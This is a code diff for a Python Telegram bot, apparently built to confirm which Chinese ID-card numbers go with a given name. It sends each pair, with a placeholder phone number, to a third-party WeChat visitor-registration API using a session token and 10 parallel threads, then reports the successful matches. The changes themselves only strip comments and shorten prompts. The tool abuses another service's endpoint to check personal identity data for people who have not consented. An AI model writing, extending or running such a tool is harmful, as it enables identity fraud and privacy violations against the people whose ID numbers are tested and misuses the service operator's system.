@@ -51,7 +51,7 @@ def run_batch_task(chat_id, msg_id, name, id_list):
     is_running = True
     token_expired = False
 
-    # 优化后的进度监控：减少刷新频率，仅百分比变化时更新
+    # 进度监控
     def progress_monitor():
         nonlocal done, is_running
         last_percent = -1
@@ -70,7 +70,7 @@ def run_batch_task(chat_id, msg_id, name, id_list):
                         )
                         last_percent = percent
                     except: pass
-            time.sleep(2) # 每2秒检查一次百分比变化
+            time.sleep(2)
 
     threading.Thread(target=progress_monitor, daemon=True).start()
 
@@ -79,7 +79,6 @@ def run_batch_task(chat_id, msg_id, name, id_list):
         if not is_running: return
         try:
             payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
-            # 缩短超时时间提高响应速度
             r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=6)
             res_data = r.json()
             if res_data.get("code") == 401:
@@ -87,23 +86,24 @@ def run_batch_task(chat_id, msg_id, name, id_list):
                 is_running = False
                 return
             if res_data.get("code") == 0:
+                # 这里只保留姓名、身份证和成功后缀
                 success_results.append(f"`{name} {id_no}` 二要素验证成功✅")
         except: pass
         finally: done += 1
 
-    # 线程数调整为 10
     with ThreadPoolExecutor(max_workers=10) as executor:
         executor.map(verify, id_list)
 
     is_running = False 
-    time.sleep(1) # 确保最后一次进度显示
+    time.sleep(1)
 
     if token_expired:
         bot.send_message(chat_id, "🚨 任务中途 Token 过期，请更新后重试。")
         return
 
     if success_results:
-        bot.send_message(chat_id, "✨ **发现成功匹配：**\n" + "\n".join(success_results), parse_mode='Markdown')
+        # 删掉了“发现成功匹配”的提示行，直接输出结果
+        bot.send_message(chat_id, "\n".join(success_results), parse_mode='Markdown')
     else:
         bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配（共 {total} 个）。")
 
@@ -121,13 +121,13 @@ def update_token(m):
 
 @bot.message_handler(commands=['start'])
 def start_batch(message):
-    bot.send_message(message.chat.id, "👤 请输入核验姓名:")
+    bot.send_message(message.chat.id, "请输入姓名:")
     user_states[message.chat.id] = {'step': 'get_name'}
 
 @bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_name')
 def get_name(message):
     user_states[message.chat.id] = {'step': 'get_ids', 'name': message.text.strip()}
-    bot.send_message(message.chat.id, f"📋 请发送身份证号列表（支持自由文本提取）:")
+    bot.send_message(message.chat.id, f"请发送身份证号列表（支持自由文本提取）:")
 
 @bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_ids')
 def get_ids(message):
